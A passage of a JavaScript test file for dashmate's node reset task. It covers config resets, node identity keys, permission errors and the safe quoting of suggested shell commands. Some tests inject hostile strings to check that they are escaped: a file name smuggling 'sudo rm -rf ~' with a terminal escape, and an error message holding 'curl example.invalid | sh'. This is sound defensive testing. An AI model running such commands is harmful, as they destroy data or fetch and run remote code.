import fs from 'fs';
import os from 'os';
import path from 'path';
import { Listr } from 'listr2';
import { asValue } from 'awilix';
import compose from '@dashevo/docker-compose';
import createDIContainer from '../../../../src/createDIContainer.js';
import HomeDir from '../../../../src/config/HomeDir.js';
import DefaultConfigs from '../../../../src/config/DefaultConfigs.js';
import Config from '../../../../src/config/Config.js';
import ConfigFile from '../../../../src/config/configFile/ConfigFile.js';
import getBaseConfigFactory from '../../../../configs/defaults/getBaseConfigFactory.js';
import getTestnetConfigFactory from '../../../../configs/defaults/getTestnetConfigFactory.js';
import getLocalConfigFactory from '../../../../configs/defaults/getLocalConfigFactory.js';
import getMainnetConfigFactory from '../../../../configs/defaults/getMainnetConfigFactory.js';
import resetNodeTaskFactory from '../../../../src/listr/tasks/resetNodeTaskFactory.js';
import quoteShellArgument from '../../../../src/util/quoteShellArgument.js';
import GroupResetCommand from '../../../../src/commands/group/reset.js';
import generateTenderdashNodeKey from '../../../../src/tenderdash/generateTenderdashNodeKey.js';
import deriveTenderdashNodeId from '../../../../src/tenderdash/deriveTenderdashNodeId.js';

describe('resetNodeTaskFactory', () => {
  let homeDir;
  let getBaseConfig;
  let getTestnetConfig;
  let getLocalConfig;
  let getMainnetConfig;
  let config;
  let configFile;
  let dockerCompose;
  let resetNodeTask;

  /**
   * Make the given configs the config file's contents and reset the first one
   *
   * @param {Config[]} configs
   */
  function useConfigs(configs) {
    [config] = configs;

    configFile = new ConfigFile([getBaseConfig(), ...configs], '4.1.0', 'abcdef12', config.getName(), null);

    resetNodeTask = resetNodeTaskFactory(
      dockerCompose,
      {},
      null,
      null,
      new DefaultConfigs([getBaseConfig, getTestnetConfig, getLocalConfig, getMainnetConfig]),
      configFile,
      homeDir,
      () => [{ name: 'drive_abci', profiles: ['platform'] }],
    );
  }

  /**
   * @param {...string} segments
   * @return {string}
   */
  function writeFile(...segments) {
    const filePath = homeDir.joinPath(...segments);
    fs.mkdirSync(path.dirname(filePath), { recursive: true });
    fs.writeFileSync(filePath, 'content');

    return filePath;
  }

  /**
   * @param {string} code
   * @param {string} message
   * @return {Error} an error as Node's filesystem calls throw it
   */
  function fsError(code, message) {
    return Object.assign(new Error(message), { code });
  }

  /**
   * Make Node's recursive removal of a path fail, the files left in place
   *
   * @param {sinon.SinonSandbox} sinon
   * @param {string} targetPath
   * @param {Error} error
   */
  function failRemoval(sinon, targetPath, error) {
    const { rmSync } = fs;
    sinon.stub(fs, 'rmSync').callsFake((removedPath, ...args) => {
      if (removedPath === targetPath) {
        throw error;
      }

      return rmSync.call(fs, removedPath, ...args);
    });
  }

  beforeEach(function beforeEach() {
    homeDir = HomeDir.createTemp();

    getBaseConfig = getBaseConfigFactory(homeDir);
    getTestnetConfig = getTestnetConfigFactory(homeDir, getBaseConfig);
    getLocalConfig = getLocalConfigFactory(getBaseConfig);
    getMainnetConfig = getMainnetConfigFactory(homeDir, getBaseConfig);

    dockerCompose = {
      isNodeRunning: this.sinon.stub().resolves(false),
      down: this.sinon.stub().resolves(),
      rm: this.sinon.stub().resolves(),
      getVolumeCandidates: this.sinon.stub().resolves([]),
      isVolumeOwned: this.sinon.stub().resolves(true),
    };

    // A testnet Evo fullnode: it runs platform, but no identity is registered
    // on chain for it, so dashmate is the only source of its node key.
    const testnetConfig = getTestnetConfig();
    testnetConfig.set('core.masternode.enable', false);
    testnetConfig.set('platform.enable', true);
    const key = generateTenderdashNodeKey();
    testnetConfig.set('platform.drive.tenderdash.node.key', key);
    testnetConfig.set('platform.drive.tenderdash.node.id', deriveTenderdashNodeId(key));

    useConfigs([testnetConfig]);
  });

  afterEach(() => {
    homeDir.remove();
  });

  function reset(ctx) {
    return new Listr([{ task: () => resetNodeTask(config) }], { renderer: 'silent' })
      .run({
        isHardReset: false,
        isForce: true,
        keepData: true,
        removeConfig: false,
        ...ctx,
      });
  }

  function hardReset(ctx) {
    return reset({ isHardReset: true, ...ctx });
  }

  // Resetting platform options clears the node identity while the config stays
  // a platform fullnode. The command saves the config before rendering, so a key
  // first generated at render time would never reach config.json and the node
  // ID would change on every render.
  it('should leave a fullnode with a new identity after a platform reset', async () => {
    const { key: previousKey } = config.get('platform.drive.tenderdash.node');

    await hardReset({ isPlatformOnlyReset: true });

    const { key, id } = config.get('platform.drive.tenderdash.node');
    expect(key).to.be.a('string').and.not.equal(previousKey);
    expect(id).to.equal(deriveTenderdashNodeId(key));
  });

  // An evonode must run the identity its operator registered on chain. A key
  // generated here would give it an unregistered node ID.
  it('should not generate an identity when platform is reset on a masternode', async () => {
    config.set('core.masternode.enable', true);

    await hardReset({ isPlatformOnlyReset: true });

    expect(config.get('core.masternode.enable')).to.be.true();
    expect(config.get('platform.drive.tenderdash.node')).to.deep.equal({ id: null, key: null });
  });

  // A full reset restores the testnet preset, which is a masternode: its
  // identity must come from the operator, never from dashmate.
  it('should not generate an identity when a full reset restores a masternode', async () => {
    await hardReset({ isPlatformOnlyReset: false });

    expect(config.get('core.masternode.enable')).to.be.true();
    expect(config.get('platform.drive.tenderdash.node')).to.deep.equal({ id: null, key: null });
  });

  // The default renderer shows a failed task's error in place of its title
  // and nothing for a task without one, and the command mutes the error.
  it('should give every step a title, so its errors are shown', () => {
    const titles = resetNodeTask(config).tasks.map((task) => task.title);

    titles.forEach((title) => expect(title).to.be.a('string').and.not.empty());
  });

  // A group reset runs this for every member before it resets any, so a
  // running member stops it before the others are reset.
  describe('the check a group reset runs first', () => {
    it('should refuse while the services the reset removes are running', async () => {
      dockerCompose.isNodeRunning.resolves(true);

      await expect(resetNodeTask.prepare(config, { isPlatformOnlyReset: true, isForce: false }))
        .to.be.rejectedWith('Running services detected');
    });

    it('should not look at running services when forced', async () => {
      dockerCompose.isNodeRunning.resolves(true);

      await resetNodeTask.prepare(config, { isPlatformOnlyReset: true, isForce: true });

      expect(dockerCompose.isNodeRunning).to.not.have.been.called();
    });

    // A member can be started while the members before it are reset, after
    // the group's check found it stopped.
    it('should look at running services again when it resets a member', async () => {
      const ctx = { isPlatformOnlyReset: true, isForce: false, keepData: true };
      const plan = await resetNodeTask.prepare(config, ctx);

      dockerCompose.isNodeRunning.resolves(true);

      await expect(new Listr([{ task: () => resetNodeTask(config, plan) }], { renderer: 'silent' }).run(ctx))
        .to.be.rejectedWith('Running services detected');

      expect(dockerCompose.rm).to.not.have.been.called();
    });

    it('should refuse what the reset itself refuses', async () => {
      await expect(resetNodeTask.prepare(config, {
        isPlatformOnlyReset: true, isHardReset: true, removeConfig: true, isForce: true,
      })).to.be.rejectedWith('Cannot reset Platform only and remove config');
    });
  });

  describe('a config without defaults', () => {
    let corePath;
    let platformPath;

    /**
     * @param {string} name
     * @param {string|null} [group]
     */
    function useConfigWithoutDefaults(name, group = null) {
      const options = getTestnetConfig().getStoredOptions();
      options.group = group;

      useConfigs([new Config(name, options)]);

      corePath = writeFile(name, 'core', 'dash.conf');
      platformPath = writeFile(name, 'platform', 'drive', 'tenderdash', 'config.toml');
    }

    // dashmate knows Platform defaults only for its presets. Without them a hard
    // Platform reset has nothing to restore, and removing the whole config
    // instead would take Core's settings with it.
    it('should refuse a hard Platform reset before touching any service', async () => {
      useConfigWithoutDefaults('devnet-ops');

      await expect(hardReset({ isPlatformOnlyReset: true, isForce: false }))
        .to.be.rejectedWith(/'devnet-ops'[\s\S]*dashmate reset --config devnet-ops --platform[\s\S]*dashmate reset --config devnet-ops --hard/);

      expect(dockerCompose.isNodeRunning).to.not.have.been.called();
      expect(dockerCompose.rm).to.not.have.been.called();
      expect(dockerCompose.down).to.not.have.been.called();
      expect(dockerCompose.getVolumeCandidates).to.not.have.been.called();
      expect(configFile.isConfigExists('devnet-ops')).to.be.true();
      expect(fs.existsSync(corePath)).to.be.true();
      expect(fs.existsSync(platformPath)).to.be.true();
    });

    // Defaults are looked up by group name, so a member of a custom group has
    // none either.
    it('should refuse a hard Platform reset of a member of a group without defaults', async () => {
      useConfigWithoutDefaults('ops_1', 'ops');

      await expect(hardReset({ isPlatformOnlyReset: true }))
        .to.be.rejectedWith(/'ops_1'/);

      expect(dockerCompose.rm).to.not.have.been.called();
      expect(configFile.isConfigExists('ops_1')).to.be.true();
      expect(fs.existsSync(corePath)).to.be.true();
    });

    // The soft Platform reset changes no options, so it needs no defaults.
    it('should still reset Platform services and data without --hard', async () => {
      useConfigWithoutDefaults('devnet-ops');

      await reset({ isPlatformOnlyReset: true });

      expect(dockerCompose.rm).to.have.been.calledOnce();
      expect(configFile.isConfigExists('devnet-ops')).to.be.true();
      expect(fs.existsSync(platformPath)).to.be.true();
    });

    // A full hard reset removing such a config is what the operator asked for.
    it('should still remove the whole config on a full hard reset', async () => {
      useConfigWithoutDefaults('devnet-ops');

      await hardReset({ isPlatformOnlyReset: false });

      expect(configFile.isConfigExists('devnet-ops')).to.be.false();
      expect(fs.existsSync(homeDir.joinPath('devnet-ops'))).to.be.false();
    });
  });

  // A config file written before `config.json` became a reserved name may
  // still hold a config by that name. Its directory would be the file that
  // holds every config, so the entry goes and the path is never removed, as
  // `config remove` does.
  describe('a legacy config named after the config file', () => {
    [
      { group: 'ops', ctx: {} },
      { group: 'local', ctx: { removeConfig: true } },
    ].forEach(({ group, ctx }) => {
      it(`should keep the config file on a hard reset of a member of group '${group}'`, async () => {
        const options = getTestnetConfig().getStoredOptions();
        options.group = group;
        useConfigs([new Config('config.json', options)]);

        const configFilePath = homeDir.joinPath('config.json');
        fs.writeFileSync(configFilePath, '{"configs":{}}');

        await hardReset({ isPlatformOnlyReset: false, ...ctx });

        expect(dockerCompose.down).to.have.been.calledOnce();
        expect(configFile.isConfigExists('config.json')).to.be.false();
        expect(fs.readFileSync(configFilePath, 'utf8')).to.equal('{"configs":{}}');
      });
    });

    // With defaults the hard reset keeps the entry, and the command then
    // renders its service files into a directory that cannot exist. Found out
    // only then, the services would already be gone.
    [true, false].forEach((isPlatformOnlyReset) => {
      it(`should refuse a ${isPlatformOnlyReset ? 'Platform' : 'full'} hard reset that keeps it`, async () => {
        const options = getTestnetConfig().getStoredOptions();
        options.group = 'testnet';
        useConfigs([new Config('config.json', options)]);

        await expect(hardReset({ isPlatformOnlyReset, isForce: false }))
          .to.be.rejectedWith(/'config\.json'[\s\S]*dashmate config remove config\.json/);

        expect(dockerCompose.isNodeRunning).to.not.have.been.called();
        expect(dockerCompose.down).to.not.have.been.called();
        expect(dockerCompose.rm).to.not.have.been.called();
        expect(configFile.isConfigExists('config.json')).to.be.true();
      });
    });
  });

  describe('a member of a group', () => {
    beforeEach(() => {
      const members = ['local_1', 'local_2'].map((name) => {
        const options = getLocalConfig().getStoredOptions();
        options.group = 'local';

        return new Config(name, options);
      });

      useConfigs(members);

      // Older homes also hold a config named after the group.
      writeFile('local', 'platform', 'drive', 'tenderdash', 'config.toml');
      writeFile('local_1', 'core', 'dash.conf');
      writeFile('local_1', 'platform', 'drive', 'tenderdash', 'config.toml');
      writeFile('local_2', 'core', 'dash.conf');
      writeFile('local_2', 'platform', 'drive', 'tenderdash', 'config.toml');
    });

    // Compose mounts each member's files from its own directory, named after
    // the config. The group name only selects the defaults.
    it('should remove its own Platform files and leave the other member\'s', async () => {
      await hardReset({ isPlatformOnlyReset: true });

      expect(fs.existsSync(homeDir.joinPath('local_1', 'platform'))).to.be.false();
      expect(fs.existsSync(homeDir.joinPath('local_1', 'core', 'dash.conf'))).to.be.true();
      expect(fs.existsSync(homeDir.joinPath('local_2', 'platform', 'drive', 'tenderdash', 'config.toml'))).to.be.true();
      expect(fs.existsSync(homeDir.joinPath('local', 'platform', 'drive', 'tenderdash', 'config.toml'))).to.be.true();
    });

    // `group reset --hard` removes the local group's configs, and with
    // --platform it removed them too, Core settings included, while Core's
    // containers and data stayed behind without a config.
    it('should refuse a hard Platform reset that would remove the config', async () => {
      await expect(hardReset({ isPlatformOnlyReset: true, removeConfig: true, isForce: false }))
        .to.be.rejectedWith(/'local_1'[\s\S]*dashmate group reset --group local --platform[\s\S]*dashmate group reset --group local --hard/);

      expect(dockerCompose.isNodeRunning).to.not.have.been.called();
      expect(dockerCompose.rm).to.not.have.been.called();
      expect(configFile.isConfigExists('local_1')).to.be.true();
      expect(fs.existsSync(homeDir.joinPath('local_1', 'core', 'dash.conf'))).to.be.true();
    });

    // The members before it were already reset, and their files are gone.
    it('should say to render the other members too when removal fails', async function test() {
      failRemoval(this.sinon, homeDir.joinPath('local_1', 'platform'), fsError('EIO', 'EIO: i/o error, rm'));

      await expect(hardReset({ isPlatformOnlyReset: true }))
        .to.be.rejectedWith("every config of group 'local'");
    });

    it('should remove only its own directory on a full hard reset', async () => {
      await hardReset({ isPlatformOnlyReset: false });

      expect(fs.existsSync(homeDir.joinPath('local_1'))).to.be.false();
      expect(fs.existsSync(homeDir.joinPath('local_2', 'core', 'dash.conf'))).to.be.true();
      expect(fs.existsSync(homeDir.joinPath('local', 'platform', 'drive', 'tenderdash', 'config.toml'))).to.be.true();
    });
  });

  describe('a path it cannot remove', () => {
    let lockedDirectories;

    /**
     * @param {number} mode
     * @param {...string} segments
     * @return {string}
     */
    function lockDirectoryWithMode(mode, ...segments) {
      const directoryPath = homeDir.joinPath(...segments);
      fs.chmodSync(directoryPath, mode);
      lockedDirectories.push(directoryPath);

      return directoryPath;
    }

    /**
     * Make a directory read-only, so the entries in it cannot be removed, the
     * way a directory Docker creates as root is for the operator
     *
     * @param {...string} segments
     * @return {string}
     */
    function lockDirectory(...segments) {
      return lockDirectoryWithMode(0o555, ...segments);
    }

    /**
     * Make a directory read-only once the reset's check has passed, just as
     * Node's recursive removal of the Platform directory starts
     *
     * @param {sinon.SinonSandbox} sinon
     * @param {...string} segments
     * @return {string}
     */
    function lockDirectoryOnRemoval(sinon, ...segments) {
      const targetPath = homeDir.joinPath('testnet', 'platform');
      const { rmSync } = fs;
      sinon.stub(fs, 'rmSync').callsFake((removedPath, ...args) => {
        if (removedPath === targetPath) {
          lockDirectory(...segments);
        }

        return rmSync.call(fs, removedPath, ...args);
      });

      return homeDir.joinPath(...segments);
    }

    /**
     * Permissions do not bind root, so a test that relies on them cannot run
     * as root.
     *
     * @param {Mocha.Context} test
     */
    function skipAsRoot(test) {
      if (process.getuid?.() === 0) {
        test.skip();
      }
    }

    beforeEach(() => {
      lockedDirectories = [];

      writeFile('testnet', 'core', 'dash.conf');
      writeFile('testnet', 'platform', 'drive', 'tenderdash', 'config.toml');
      writeFile('testnet', 'platform', 'gateway', 'ssl', 'bundle.crt');
      writeFile('testnet', 'platform', 'gateway', 'ssl', 'private.key');
      writeFile('testnet', 'platform', 'gateway', 'rate_limiter', 'rate_limiter.yaml');
    });

    afterEach(() => {
      lockedDirectories
        ?.filter((directoryPath) => fs.existsSync(directoryPath))
        .forEach((directoryPath) => fs.chmodSync(directoryPath, 0o755));
    });

    // A reset that leaves Platform files behind and reports success leaves the
    // next start or setup to run on them unnoticed. Finding out once the
    // services and part of the files are gone would leave a node whose Compose
    // project no longer loads, so the reset checks first and changes nothing.
    it('should refuse before touching anything and name each path it cannot remove', async function test() {
      skipAsRoot(this);

      const { key } = config.get('platform.drive.tenderdash.node');
      const sslPath = lockDirectory('testnet', 'platform', 'gateway', 'ssl');
      const rateLimiterPath = lockDirectory('testnet', 'platform', 'gateway', 'rate_limiter');

      const error = await hardReset({ isPlatformOnlyReset: true, isForce: false }).then(
        () => { throw new Error('the reset succeeded'); },
        (e) => e,
      );

      expect(error.message).to.include(`'${sslPath}'`);
      expect(error.message).to.include(`'${rateLimiterPath}'`);
      expect(error.message).to.include('sudo chown -R');
      expect(error.message).to.include('chmod -R u+rwX');
      expect(error.message).to.include('run the reset again');

      expect(dockerCompose.isNodeRunning).to.not.have.been.called();
      expect(dockerCompose.rm).to.not.have.been.called();
      expect(fs.existsSync(homeDir.joinPath('testnet', 'platform', 'drive', 'tenderdash', 'config.toml'))).to.be.true();
      expect(config.get('platform.drive.tenderdash.node.key')).to.equal(key);
    });

    // Removing an empty directory needs only its parent to be writable, so a
    // read-only one that Docker created for a missing mount source is removed.
    it('should remove an empty directory it cannot write', async function test() {
      skipAsRoot(this);

      fs.mkdirSync(homeDir.joinPath('testnet', 'platform', 'gateway', 'envoy.yaml'));
      lockDirectory('testnet', 'platform', 'gateway', 'envoy.yaml');

      await hardReset({ isPlatformOnlyReset: true });

      expect(fs.existsSync(homeDir.joinPath('testnet', 'platform'))).to.be.false();
    });

    it('should refuse to remove a config it cannot remove completely', async function test() {
      skipAsRoot(this);

      const sslPath = lockDirectory('testnet', 'platform', 'gateway', 'ssl');

      await expect(reset({ isHardReset: true, removeConfig: true }))
        .to.be.rejectedWith(sslPath);

      expect(dockerCompose.down).to.not.have.been.called();
      expect(configFile.isConfigExists('testnet')).to.be.true();
    });

    // The Platform directory itself goes only if the config's directory is
    // writable, and nothing inside tells that.
    it('should refuse when the directory holding the target is not writable', async function test() {
      skipAsRoot(this);

      const configPath = lockDirectory('testnet');

      const error = await hardReset({ isPlatformOnlyReset: true }).then(
        () => { throw new Error('the reset succeeded'); },
        (e) => e,
      );

      expect(error.message).to.include(`'${configPath}'`);
      expect(error.message).to.include(`chmod u+rwx ${quoteShellArgument(configPath)}`);
      expect(dockerCompose.rm).to.not.have.been.called();
    });

    // Nothing in the config's directory can even be looked at, so the
    // directory itself is what needs fixing.
    it('should name the directory holding the target when it cannot be searched', async function test() {
      skipAsRoot(this);

      const configPath = lockDirectoryWithMode(0o444, 'testnet');

      const error = await hardReset({ isPlatformOnlyReset: true }).then(
        () => { throw new Error('the reset succeeded'); },
        (e) => e,
      );

      expect(error.message).to.include(`chmod u+rwx ${quoteShellArgument(configPath)}`);
      expect(error.message).to.not.include('chmod -R');
      expect(dockerCompose.rm).to.not.have.been.called();
    });

    // A link that points nowhere is still a path to remove from its directory.
    it('should check the directory holding a target that is a dangling link', async function test() {
      skipAsRoot(this);

      fs.rmSync(homeDir.joinPath('testnet', 'platform'), { recursive: true });
      fs.symlinkSync(homeDir.joinPath('nowhere'), homeDir.joinPath('testnet', 'platform'));
      const configPath = lockDirectory('testnet');

      await expect(hardReset({ isPlatformOnlyReset: true }))
        .to.be.rejectedWith(`chmod u+rwx ${quoteShellArgument(configPath)}`);

      expect(dockerCompose.rm).to.not.have.been.called();
    });

    it('should count paths beyond the first ten rather than list them', async function test() {
      skipAsRoot(this);

      const lockedPaths = Array.from({ length: 12 }, (_, i) => {
        writeFile('testnet', 'platform', `locked-${i}`, 'file');

        return lockDirectory('testnet', 'platform', `locked-${i}`);
      });

      await expect(hardReset({ isPlatformOnlyReset: true }))
        .to.be.rejectedWith(/and 2 more/);

      expect(lockedPaths).to.have.lengthOf(12);
    });

    /**
     * Move the test to a home directory whose path a shell must be given
     * quoted, with the same files as the one it replaces
     *
     * @param {string} [prefix] - the start of the directory's name
     */
    function useHomeDirWithApostrophe(prefix = "dashmate-o'brien-") {
      homeDir.remove();
      homeDir = new HomeDir(fs.mkdtempSync(path.join(os.tmpdir(), prefix)));

      useConfigs([config]);

      writeFile('testnet', 'core', 'dash.conf');
      writeFile('testnet', 'platform', 'drive', 'tenderdash', 'config.toml');
      writeFile('testnet', 'platform', 'gateway', 'ssl', 'private.key');
    }

    // The commands are there to be pasted. Nothing validates the home
    // directory's path, and a quote in it ended the quoting early.
    it('should quote the paths in the commands it gives for a shell', async function test() {
      skipAsRoot(this);
      useHomeDirWithApostrophe();

      const sslPath = lockDirectory('testnet', 'platform', 'gateway', 'ssl');
      const platformPath = homeDir.joinPath('testnet', 'platform');
      const quotedPlatformPath = `'${platformPath.split("'").join("'\\''")}'`;
      const { uid, gid } = os.userInfo();

      const error = await hardReset({ isPlatformOnlyReset: true }).then(
        () => { throw new Error('the reset succeeded'); },
        (e) => e,
      );

      expect(error.message).to.include(`  sudo chown -R ${uid}:${gid} ${quotedPlatformPath}\n`);
      expect(error.message).to.include(`  chmod -R u+rwX ${quotedPlatformPath}\n`);
      expect(error.message).to.include(`  '${sslPath.split("'").join("\\'")}'\n`);
    });

    it('should quote the directory holding the target in the commands it gives', async function test() {
      skipAsRoot(this);
      useHomeDirWithApostrophe();

      const configPath = lockDirectory('testnet');
      const quotedConfigPath = `'${configPath.split("'").join("'\\''")}'`;
      const { uid, gid } = os.userInfo();

      const error = await hardReset({ isPlatformOnlyReset: true }).then(
        () => { throw new Error('the reset succeeded'); },
        (e) => e,
      );

      expect(error.message).to.include(`  sudo chown ${uid}:${gid} ${quotedConfigPath}\n`);
      expect(error.message).to.include(`  chmod u+rwx ${quotedConfigPath}\n`);
    });

    it('should quote the path in the removal it advises once removal has begun', async function test() {
      skipAsRoot(this);
      useHomeDirWithApostrophe();

      lockDirectoryOnRemoval(this.sinon, 'testnet', 'platform', 'gateway', 'ssl');
      const platformPath = homeDir.joinPath('testnet', 'platform');

      await expect(hardReset({ isPlatformOnlyReset: true }))
        .to.be.rejectedWith(`  sudo rm -rf '${platformPath.split("'").join("'\\''")}'\n`);
    });

    // Plain single quotes keep a line break, which splits the command, and
    // dash, Debian's and Ubuntu's /bin/sh, reads dollar-single quotes as a
    // dollar sign and a quoted string: a printed command would act on another
    // path. Such a path gets no command to paste, only the commands to run on
    // it and the path escaped, for reading.
    it('should give no command to paste for a path holding a control character', async function test() {
      skipAsRoot(this);
      useHomeDirWithApostrophe('dashmate-line\nbreak-');

      lockDirectory('testnet', 'platform', 'gateway', 'ssl');
      const platformPath = homeDir.joinPath('testnet', 'platform');

      const error = await hardReset({ isPlatformOnlyReset: true }).then(
        () => { throw new Error('the reset succeeded'); },
        (e) => e,
      );

      const lines = error.message.split('\n');

      expect(lines.filter((line) => /^\s*(sudo|chmod|chown)\b/.test(line))).to.be.empty();
      const { uid, gid } = os.userInfo();
      expect(lines).to.include(`  'sudo chown -R ${uid}:${gid}' and then 'chmod -R u+rwX' on the path below.`);
      expect(lines).to.include(`  '${platformPath.replace('\n', '\\n')}'`);
    });

    it('should give no removal to paste for a path holding a control character', async function test() {
      skipAsRoot(this);
      useHomeDirWithApostrophe('dashmate-line\nbreak-');

      lockDirectoryOnRemoval(this.sinon, 'testnet', 'platform', 'gateway', 'ssl');
      const platformPath = homeDir.joinPath('testnet', 'platform');

      const error = await hardReset({ isPlatformOnlyReset: true }).then(
        () => { throw new Error('the reset succeeded'); },
        (e) => e,
      );

      const lines = error.message.split('\n');

      expect(lines.filter((line) => /^\s*sudo\b/.test(line))).to.be.empty();
      expect(lines).to.include("  'sudo rm -rf' on the path below.");
      expect(lines).to.include(`  '${platformPath.replace('\n', '\\n')}'`);
    });

    // A file name can hold a line break or a terminal control sequence. Shown
    // as it is, the rest of the name would read as a line of the message, an
    // instruction to run included.
    it('should show each path it cannot remove on one line', async function test() {
      skipAsRoot(this);

      const lockedName = 'locked\nsudo rm -rf ~\u001b[2K';
      writeFile('testnet', 'platform', lockedName, 'file');
      lockDirectory('testnet', 'platform', lockedName);

      const error = await hardReset({ isPlatformOnlyReset: true }).then(
        () => { throw new Error('the reset succeeded'); },
        (e) => e,
      );

      const lines = error.message.split('\n');
      const platformPath = homeDir.joinPath('testnet', 'platform');

      expect(lines).to.include(`  '${platformPath}${path.sep}locked\\nsudo rm -rf ~\\x1b[2K'`);
      expect(lines.filter((line) => line.startsWith('sudo rm'))).to.be.empty();
      expect(error.message).to.not.include('\u001b');
    });

    it('should show a filesystem error on one line', async function test() {
      failRemoval(
        this.sinon,
        homeDir.joinPath('testnet', 'platform'),
        fsError('EIO', 'EIO: i/o error\nRun: curl example.invalid | sh'),
      );

      const error = await hardReset({ isPlatformOnlyReset: true }).then(
        () => { throw new Error('the reset succeeded'); },
        (e) => e,
      );

      expect(error.message).to.include('EIO: i/o error\\nRun: curl example.invalid | sh');
      expect(error.message.split('\n').filter((line) => line.startsWith('Run:'))).to.be.empty();
    });

    it('should show a filesystem error the check meets on one line', async function test() {
      const sslPath = homeDir.joinPath('testnet', 'platform', 'gateway', 'ssl');
      const { lstatSync } = fs;
      this.sinon.stub(fs, 'lstatSync').callsFake((checkedPath, ...args) => {
        if (checkedPath === sslPath) {
          const error = new Error('EIO: i/o error\nRun: curl example.invalid | sh');
          error.code = 'EIO';
          throw error;
        }

        return lstatSync.call(fs, checkedPath, ...args);
      });

      const error = await hardReset({ isPlatformOnlyReset: true }).then(
        () => { throw new Error('the reset succeeded'); },
        (e) => e,
      );

      expect(error.message).to.include('EIO: i/o error\\nRun: curl example.invalid | sh');
      expect(error.message.split('\n').filter((line) => line.startsWith('Run:'))).to.be.empty();
      expect(error.message).to.include('Nothing has been changed');
      expect(dockerCompose.rm).to.not.have.been.called();
    });

    // A link out of the config's directory, to another node's files or the
    // host's certificates, must lose the link and nothing it points to.
    it('should remove a symbolic link and not what it points to', async () => {
      const outsidePath = writeFile('outside', 'keep.txt');
      fs.symlinkSync(path.dirname(outsidePath), homeDir.joinPath('testnet', 'platform', 'gateway', 'link'));

      await hardReset({ isPlatformOnlyReset: true });

      expect(fs.existsSync(homeDir.joinPath('testnet', 'platform'))).to.be.false();
      expect(fs.readFileSync(outsidePath, 'utf8')).to.equal('content');
    });

    // The target itself can be a link, to a directory elsewhere or to one a
    // storage move retired. The link goes and what it points to stays. Left
    // in place, a link that points nowhere would have the Platform files
    // rendered through it.
    it('should remove a target that is a link, even one that points nowhere', async () => {
      const platformPath = homeDir.joinPath('testnet', 'platform');
      const outsidePath = writeFile('outside', 'keep.txt');
      fs.rmSync(platformPath, { recursive: true });

      fs.symlinkSync(path.dirname(outsidePath), platformPath);
      await hardReset({ isPlatformOnlyReset: true });

      // lstat: a link that points nowhere does not exist to stat
      expect(() => fs.lstatSync(platformPath)).to.throw().with.property('code', 'ENOENT');
      expect(fs.readFileSync(outsidePath, 'utf8')).to.equal('content');

      fs.symlinkSync(homeDir.joinPath('retired'), platformPath);
      await hardReset({ isPlatformOnlyReset: true });

      expect(() => fs.lstatSync(platformPath)).to.throw().with.property('code', 'ENOENT');
    });

    // A directory that becomes read-only between the check and the removal
    // makes Node's recursive removal fail, naming the target at most. The
    // reset does not go on past the failure: it names each path left that this
    // user cannot remove, and how to recover.
    it('should name what is left that it cannot remove once removal has failed', async function test() {
      skipAsRoot(this);

      const sslPath = lockDirectoryOnRemoval(this.sinon, 'testnet', 'platform', 'gateway', 'ssl');
      const platformPath = homeDir.joinPath('testnet', 'platform');

      const error = await hardReset({ isPlatformOnlyReset: true }).then(
        () => { throw new Error('the reset succeeded'); },
        (e) => e,
      );

      expect(fs.rmSync.withArgs(platformPath)).to.have.been.calledOnce();
      expect(error.message).to.include('for lack of permission');
      expect(error.message.split('\n')).to.include(`  '${sslPath}'`);
      expect(error.message).to.include('dashmate config render --config testnet');
      expect(fs.existsSync(path.join(sslPath, 'bundle.crt'))).to.be.true();
    });

    // Other failures during removal leave the same half-removed files behind.
    it('should give the same recovery for any other failure during removal', async function test() {
      failRemoval(this.sinon, homeDir.joinPath('testnet', 'platform'), fsError('EIO', 'EIO: i/o error, rm'));

      const error = await hardReset({ isPlatformOnlyReset: true }).then(
        () => { throw new Error('the reset succeeded'); },
        (e) => e,
      );

      expect(error.message).to.match(/EIO: i\/o error[\s\S]*dashmate config render --config testnet/);
      expect(error.message.split('\n').filter((line) => /^\s*sudo\b/.test(line))).to.be.empty();
    });

    // What the check cannot foresee fails once removal has begun, and
    // permissions do not show it. EPERM comes from an access restriction, such
    // as a file in a sticky directory, which more rights get past, or from a
    // filesystem protection, such as an immutable file, which they do not.
    // Node's error is shown, and Compose then needs the service files
    // rendered again before the reset can run.
    it('should show the removal\'s error for a failure the check cannot foresee', async function test() {
      failRemoval(
        this.sinon,
        homeDir.joinPath('testnet', 'platform'),
        fsError('EPERM', 'EPERM: operation not permitted, rm'),
      );

      const error = await hardReset({ isPlatformOnlyReset: true }).then(
        () => { throw new Error('the reset succeeded'); },
        (e) => e,
      );

      const lines = error.message.split('\n');
      expect(error.message).to.include('EPERM: operation not permitted, rm');
      expect(lines).to.include('More rights help only when access rights are what stop the removal, for example:');
      expect(lines).to.include(`  sudo rm -rf ${quoteShellArgument(homeDir.joinPath('testnet', 'platform'))}`);
      expect(lines.find((line) => line.startsWith('If that fails with EPERM too')))
        .to.include('such as the immutable flag').and.include('find it and clear it,');
      expect(error.message).to.include('dashmate config render --config testnet');
      expect(dockerCompose.rm).to.have.been.calledOnce();
    });

    // EACCES is an access restriction only, which more rights get past.
    it('should give a removal with more rights for an access error the check cannot foresee', async function test() {
      failRemoval(
        this.sinon,
        homeDir.joinPath('testnet', 'platform'),
        fsError('EACCES', 'EACCES: permission denied, rm'),
      );

      const error = await hardReset({ isPlatformOnlyReset: true }).then(
        () => { throw new Error('the reset succeeded'); },
        (e) => e,
      );

      const lines = error.message.split('\n');
      expect(error.message).to.include('EACCES: permission denied, rm');
      expect(lines).to.include('Remove it with sufficient rights, for example:');
      expect(lines).to.include(`  sudo rm -rf ${quoteShellArgument(homeDir.joinPath('testnet', 'platform'))}`);
      expect(error.message).to.not.include('immutable');
      expect(error.message).to.include('dashmate config render --config testnet');
    });

    // Node's recursive removal is what the reset used before it could report
    // each path, and it still removes the files. The walk only checks and
    // reports.
    it('should remove the files with Node\'s recursive removal', async function test() {
      this.sinon.spy(fs, 'rmSync');
      const platformPath = homeDir.joinPath('testnet', 'platform');

      await hardReset({ isPlatformOnlyReset: true });

      expect(fs.rmSync).to.have.been.calledWith(platformPath, { recursive: true, force: true });
      expect(fs.existsSync(platformPath)).to.be.false();
      expect(fs.existsSync(homeDir.joinPath('testnet', 'core', 'dash.conf'))).to.be.true();
    });
  });

  describe('a node with Platform disabled', () => {
    beforeEach(() => {
      // A mainnet hard reset leaves Platform disabled, as mainnet's defaults
      // have it, while the Platform data the node ran with may still be there.
      const mainnetConfig = getMainnetConfig();
      mainnetConfig.set('platform.gateway.ssl.enabled', true);

